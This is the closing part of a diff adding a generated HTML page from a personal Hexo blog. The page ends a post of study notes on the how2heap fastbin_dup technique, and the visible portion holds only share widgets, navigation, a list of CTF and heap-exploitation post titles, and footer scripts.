+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"hoe2heap学习笔记(1)——fastbin_dup　| good good study,day day up!　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2019/11/20/XCTF-format2-整数溢出/" title="下一篇: XCTF-format2-整数溢出">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2019/12/02/how2heap学习笔记-1-——fastbin-dup/">hoe2heap学习笔记(1)——fastbin_dup</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/20/XCTF-format2-整数溢出/">XCTF-format2-整数溢出</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/11/18/mma-ctf-2nd-2016-greeting-150/">mma-ctf-2nd-2016-greeting-150</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/22/MCTF校赛WP-2/">MCTF校赛WP(2)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/10/17/MCTF初赛WP-1/">MCTF初赛WP(1)</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/09/10/初次学习RSA密码/">初次学习RSA密码</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/31/use-after-free的学习/">use after free的学习</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/27/使用LibcSearcher解题/">使用LibcSearcher解题</a></li><li class="post-list-item"><a class="post-list-link" href="/2019/07/21/heap-1/">heap-1</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2019 HeZhaochen
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+            <div class="visit">
+                
+                    <span id="busuanzi_container_site_pv" style='display:none'>
+                        <span id="site-visit" title="本站到访数"><i class="fa fa-user" aria-hidden="true"></i><span id="busuanzi_value_site_uv"></span>
+                        </span>
+                    </span>
+                
+                
+                    <span>| </span>
+                
+                
+                    <span id="busuanzi_container_page_pv" style='display:none'>
+                        <span id="page-visit"  title="本页阅读量"><i class="fa fa-eye animated infinite pulse" aria-hidden="true"></i><span id="busuanzi_value_page_pv"></span>
+                        </span>
+                    </span>
+                
+            </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 2;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
